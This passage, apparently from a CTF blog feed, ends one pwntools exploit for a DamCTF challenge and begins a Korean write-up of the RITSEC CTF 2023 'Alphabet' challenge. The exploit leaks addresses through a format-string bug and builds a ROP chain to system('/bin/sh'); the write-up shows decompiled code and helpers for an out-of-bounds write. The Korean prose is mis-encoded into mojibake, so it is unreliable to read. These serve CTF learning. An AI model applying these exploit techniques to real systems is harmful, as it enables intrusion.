b&#x27;cccc&#x27;:</span></span><br><span class="line">    <span class="comment">#     p.sendline(b&#x27;dddd&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Italy&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Rome&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Australia&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Canberra&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Ireland&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Dublin&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Jordan&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Amman&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Sweden&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Stockholm&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;India&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Delhi&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Egypt&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Cairo&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Tanzania&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Dodoma&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Lebanon&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Beirut&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Kenya&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Nairobi&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Denmark&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Copenhagen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Peru&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Lima&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    text = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Incorrect.&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall-p&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;chals.damctf.xyz&#x27;</span>, <span class="number">30888</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack : &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x580</span></span><br><span class="line">info(<span class="string">&#x27;pie : &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%45$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>) -<span class="number">0x5902a</span>  - <span class="number">0x28000</span></span><br><span class="line">info(<span class="string">&#x27;libc : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># put payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(libc.address + <span class="number">0x2a3e5</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libc.address + <span class="number">0x29cd6</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;review?\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;below:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># control rip</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x440</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(libc.address + <span class="number">0x562ec</span>) <span class="comment"># leave ret</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;records?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dam&#123;my_f4v0r173_15_bl4d3_runn3r_b1n6b0n6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - Alphabet (oob read, write)</title>
      <link href="/230412-ritsecctf2023-3Alphabet/"/>
      <url>/230412-ritsecctf2023-3Alphabet/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>This new protocol letâ€™s you update the official English alphabet in real time! Easy as A#_<br><code>nc alphabet.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 500 points]</li></ul><p>ì›¬ë§Œí•œ ì”¨í…ì€ ì·¨ì•½ì  ì°¾ëŠ” ê²ƒë³´ë‹¤ ìµìŠ¤ê°€ í›¨ì”¬ ë” ì–´ë ¤ìš´ ê²ƒ ê°™ë‹¤.. ã… ã…  ì´ ë¬¸ì œê°€ ê·¼ëž˜ í’€ì–´ë³¸ ë¬¸ì œ ì¤‘ì— ìµìŠ¤ê°€ ê°€ìž¥ íž˜ë“¤ê³  ì–´ë ¤ì› ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë¨¼ì € <code>main</code> í•¨ìˆ˜ì´ë‹¤.</p><p>ì°¸ê³ ë¡œ seccompì´ ìžˆì–´ì„œ í™•ì¸í•´ì•¼ í•œë‹¤. ëŒ€ì¶© <code>flag.txt orw</code>í•´ì•¼í•˜ê³  <code>mprotect</code> í•¨ìˆ˜ê°€ í—ˆìš©ë˜ì–´ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  seccomp_rules();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="title function_">puts</span><span class="params">(<span class="string">&quot;Running very important code and threads&quot;</span>)</span>;</span><br><span class="line">    <span class="keyword">while</span> ( !fgets(buf, <span class="number">0x2D</span>, <span class="built_in">stdin</span>) );         <span class="comment">// fgets@got -&gt; gets</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt; <span class="number">44</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = i;</span><br><span class="line">LABEL_8:</span><br><span class="line">    buf[v3] = <span class="number">0</span>;</span><br><span class="line">    use_packet(buf, v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Scrambled alphabet sent&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì£¼ì„ì€ ìµìŠ¤ì™€ ê´€ë ¨ëœê±´ë°.. ì¼ë‹¨ ë¬´ì‹œí•˜ê³  ì½”ë“œ ë¶„ì„ì„ í•´ë³´ìž. <code>fgets</code> í•¨ìˆ˜ë¡œ 0x2D í¬ê¸°ë§Œí¼ <code>buf</code>ì— ìž…ë ¥ì„ ë°›ì•„ì„œ ì˜¤ë²„í”Œë¡œìš°ëŠ” ì¼ì–´ë‚˜ì§€ ì•ŠëŠ”ë‹¤. <code>\n</code>ì´ ì˜¤ë©´ <code>break</code>í•˜ê³  ìž…ë ¥í•œ sizeì™€ í•¨ê»˜ <code>use_packet</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•œë‹¤. sizeê°€ 44ë³´ë‹¤ í¬ë©´ <code>v3</code> ë³€ìˆ˜ê°€ ì •ì˜ë˜ì§€ ì•Šìœ¼ë‹ˆ ì¡°ì‹¬í•˜ìž. ìµìŠ¤í•  ë•Œ <code>fgets@got</code>ë¥¼ <code>gets</code>í•¨ìˆ˜ë¡œ ë®ì—ˆì—ˆëŠ”ë° <code>v3</code> ë³€ìˆ˜ê°€ ì •ì˜ë˜ì§€ ì•Šì•„ ìµìŠ¤ ì½”ë“œì—ì„œ ì–µì§€ë¡œ ì •ì˜í•´ì¤¬ë‹¤.</p><p><code>use_packet</code> í•¨ìˆ˜ë¥¼ ì‚´íŽ´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">use_packet</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 idx1; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 idx2; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Using packet&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">17</span> &amp;&amp; *buf == <span class="string">&#x27;Z&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="number">8</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] )<span class="comment">// ë§ˆì§€ë§‰ ë°”ì´íŠ¸ ê²€ì‚¬</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(buf[<span class="number">1</span>]);</span><br><span class="line">    idx1 = *(buf + <span class="number">2</span>);</span><br><span class="line">    idx2 = *(buf + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( idx1 &lt;= <span class="number">18</span> &amp;&amp; idx2 &lt;= <span class="number">18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = qword_404088;</span><br><span class="line">      *(buf + <span class="number">0x12</span>) = global_alphabet;</span><br><span class="line">      *(buf + <span class="number">26</span>) = v2;</span><br><span class="line">      <span class="built_in">strcpy</span>(buf + <span class="number">34</span>, <span class="string">&quot;qrstuvwxyz&quot;</span>);</span><br><span class="line">      *ptr = *&amp;buf[idx1 + <span class="number">18</span>];                  <span class="comment">// oob read</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Grabbed new alphabet characters: %s\n&quot;</span>, ptr);</span><br><span class="line">      *&amp;buf[idx2 + <span class="number">18</span>] = *ptr;                  <span class="comment">// oob write</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Placed new letters into alphabet&quot;</span>);</span><br><span class="line">      v3 = *(buf + <span class="number">26</span>);</span><br><span class="line">      global_alphabet = *(buf + <span class="number">18</span>);            <span class="comment">// bss ì˜ì—­ì— ë°ì´í„° ì“°ê¸° ê°€ëŠ¥</span></span><br><span class="line">      qword_404088 = v3;</span><br><span class="line">      qword_404090 = *(buf + <span class="number">34</span>);</span><br><span class="line">      word_404098 = *(buf + <span class="number">21</span>);</span><br><span class="line">      byte_40409A = buf[<span class="number">44</span>];</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Updated the alphabet&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;An index is too big&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                                               <span class="comment">// ___stack_chk_fail@got -&gt; ret</span></span><br></pre></td></tr></table></figure><p>ì²˜ìŒ ifë¬¸ìœ¼ë¡œ ì´ê²ƒì €ê²ƒ ê²€ì‚¬í•œë‹¤. ìž…ë ¥ê°’ì˜ ì²« ê¸€ìžëŠ” <code>Z</code>ì—¬ì•¼ í•œë‹¤. ë‘ ë²ˆì§¸ ê¸€ìžëŠ” <code>\x08</code>ì´ì–´ì•¼ í•œë‹¤. ê·¸ë¦¬ê³  <code>calc_checksum</code> í•¨ìˆ˜ë¡œ ìž…ë ¥ê°’ì˜ ë§ˆì§€ë§‰ ê¸€ìžë¥¼ ê²€ì‚¬í•˜ê³  ìžˆë‹¤. ìµìŠ¤ ì½”ë“œ ì§¤ ë•Œ pythonìœ¼ë¡œ <code>calc_checksum</code> í•¨ìˆ˜ë¥¼ êµ¬í˜„í•´ì„œ ë§ˆì§€ë§‰ ê¸€ìž í•œ ë°”ì´íŠ¸ë¥¼ ë„£ì–´ì£¼ìž. ê·¸ ë‹¤ìŒ ê¸€ìžëŠ” <code>buf</code>ì˜ indexë¡œ ì‚¬ìš©í•˜ê³  ìžˆê³ , ë§ˆì§€ë§‰ì—ëŠ” <code>bss</code> ì˜ì—­ì— ê°’ì„ ë³µì‚¬í•´ì£¼ê³  ìžˆë‹¤. payloadë¥¼ ë³´ë‚´ì•¼í•˜ëŠ” í˜•ì‹ì€ ì•„ëž˜ì™€ ê°™ë‹¤. (êµ¬ì¡°ì²´ ì •ë¦¬)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(idx1, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(idx2, signed=<span class="literal">True</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br></pre></td></tr></table></figure><p><code>idx1</code>ê³¼ <code>idx2</code> í¬ê¸° ì œí•œì„ í•˜ê³  ìžˆëŠ”ë°, ìŒìˆ˜ëŠ” ì œí•œí•˜ì§€ ì•Šì•„ oobë¥¼ ì˜ì‹¬í•  ìˆ˜ ìžˆë‹¤. (ê·¸ëž˜ì„œ ìœ„ì˜ êµ¬í˜„ì—ì„œ <code>signed=True</code>ë¥¼ ì‚¬ìš©í–ˆë‹¤.)</p><p>ì´ì œ ì·¨ì•½ì ì„ ì°¾ì•„ë³´ìž. <code>*ptr = *&amp;buf[idx1 + 18];</code> ì´ ë¼ì¸ìœ¼ë¡œ <code>*ptr</code>ì„ ì •ì˜í•´ì£¼ëŠ”ë° ë°”ë¡œ ì•„ëž˜ ì¤„ì—ì„œ <code>printf</code>ë¡œ <code>ptr</code>ì„ ì¶œë ¥í•´ì£¼ê¸° ë•Œë¬¸ì— ìŠ¤íƒì— ìžˆëŠ” ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìžˆë‹¤.(oob read) ê·¸ë¦¬ê³  <code>*&amp;buf[idx2 + 18] = *ptr;</code> ì´ ë¼ì¸ì„ í†µí•´ oob writeê°€ ë°œìƒí•  ìˆ˜ ìžˆë‹¤. ìž. ì´ ë‘ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìžˆëŠ” ì´ìœ ëŠ” <code>idx1</code>ì™€ <code>idx2</code>ê°€ ìš°ë¦¬ì˜ ìž…ë ¥ê°’ì´ê³ , ì´ ìž…ë ¥ê°’ ì¸ë±ìŠ¤ë¥¼ ê²€ì¦í•˜ì§€ ì•Šì•„ì„œ <code>buf</code>ì—ì„œ ë²—ì–´ë‚œ ê³³ì— ì ‘ê·¼í•  ìˆ˜ ìžˆê¸° ë•Œë¬¸ì´ë‹¤. </p><p>oob writeëŠ” ìµìŠ¤í•  ë•Œ ì•„ëž˜ì²˜ëŸ¼ êµ¬í˜„í•´ì„œ ì‚¬ìš©í–ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18 = addr</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawbëŠ” í•œ ë°”ì´íŠ¸ì”© ì¼ì§€ë§Œ aawëŠ” aawbë¥¼ í˜¸ì¶œí•´ì„œ 8ë°”ì´íŠ¸ë¥¼ ì“¸ ê²ƒ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ptr = *&amp;buf[idx1 + <span class="number">18</span>];</span><br><span class="line">*&amp;buf[idx2 + <span class="number">18</span>] = *ptr;  </span><br></pre></td></tr></table></figure><p>ìž…ë ¥ê°’ì´ <code>idx2</code>ë‹ˆê¹Œ <code>payload</code>ì—ì„œ <code>idx2</code>ì— ë“¤ì–´ê°ˆ ë¶€ë¶„ì€ <code>ptr - buf - 18</code>ì´ë‹¤. ìœ„ì˜ ë‚´ê°€ ë§Œë“  python í•¨ìˆ˜ <code>aawb</code>ì—ì„œëŠ” <code>ptr</code>ì„ <code>addr</code>ë¡œ ì§€ì •í–ˆë‹¤. ì´ ìœ„ì¹˜ì— ë“¤ì–´ê°ˆ ê°’ì€ <code>idx1</code>ì— ë”°ë¼ ê²°ì •ë˜ëŠ”ë° ì´ê²ƒì€ <code>libc</code>ì—ì„œ <code>/bin/sh</code> ë¬¸ìžì—´ì„ ì°¾ëŠ” ê²ƒì²˜ëŸ¼ <code>next(libc.search(bytes([val])) - buf - 18</code>ë¡œ ìž‘ì„±í•´ì£¼ì—ˆë‹¤. <code>- buf - 18</code>ì„ í•´ì¤€ ì´ìœ ëŠ” <code>idx2</code>ì— ë“¤ì–´ê°ˆ ê°’ì„ ì°¾ëŠ” ê²ƒê³¼ ë™ì¼í•œ ì›ë¦¬ì´ë‹¤. ì°¸ê³ ë¡œ <code>next(libc.search(bytes([val]))</code>ì€ <code>libc</code>ì—ì„œ <code>val</code> ê°’ì„ ì°¾ëŠ” ê²ƒì¸ë°, <code>val</code>ì€ í•œ ë°”ì´íŠ¸ì´ë‹¤. </p><p>ì™œ í•œ ë°”ì´íŠ¸ì”© ì°¾ì•„ì„œ ê°’ì„ ì¨ì¤„ê¹Œ? ë§Œì•½ <code>x ì£¼ì†Œ</code>ì— <code>0x41424344</code>ì´ë¼ëŠ” ê°’ì„ ì“°ê³  ì‹¶ë‹¤ê³  í•˜ìž. ì´ë¥¼ ìœ„í•´ì„œ <code>0x41424344ì´ ì €ìž¥ëœ ì£¼ì†Œ</code>ë¥¼ ì°¾ì•„ì•¼ í•œë‹¤. í•˜ì§€ë§Œ ì € ê°’ì´ ì €ìž¥ëœ ì£¼ì†ŒëŠ” ì°¾ê¸°ê°€ íž˜ë“¤ ìˆ˜ë„ ìžˆë‹¤. ê·¸ëž˜ì„œ í•œ ë°”ì´íŠ¸ì”© ì°¾ì•„ ì¨ì£¼ëŠ” ê²ƒì´ë‹¤. ì „ì²´ ê°’ì„ ì“°ê¸° ìœ„í•´ì„œ <code>aaw</code>ë¼ëŠ” í•¨ìˆ˜ë¥¼ ì •ì˜í–ˆê³  ì“°ê³  ì‹¶ì€ ê°’ ê¸¸ì´ë§Œí¼ <code>aawb</code>ë¥¼ í˜¸ì¶œí•´ì„œ ê°’ì„ ì“´ë‹¤. </p><p>ë¬¸ì œì—ì„œ <code>while(1)</code>ë¡œ ìž…ë ¥ê°’ì„ ê³„ì† ì“¸ ìˆ˜ ìžˆì–´ì„œ ì´ì™€ ê°™ì€ ë°œìƒì´ ê°€ëŠ¥í–ˆë‹¤.</p><p>ë§ˆì§€ë§‰ìœ¼ë¡œ ìš°ë¦¬ê°€ pythonìœ¼ë¡œ êµ¬í˜„í•´ì•¼í•  <code>calc_checksum</code>ì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">calc_checksum</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 result; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, buf, size);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size - <span class="number">1</span>; ++i )</span><br><span class="line">    result += *(dest + i) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="built_in">free</span>(dest);                                   <span class="comment">// free@got -&gt; printf</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xorì„ ë‘ ë²ˆí•˜ë©´ ì›ëž˜ëŒ€ë¡œ ëŒì•„ì˜¤ëŠ” ì„±ì§ˆì„ ì´ìš©í•˜ë©´ ëœë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title 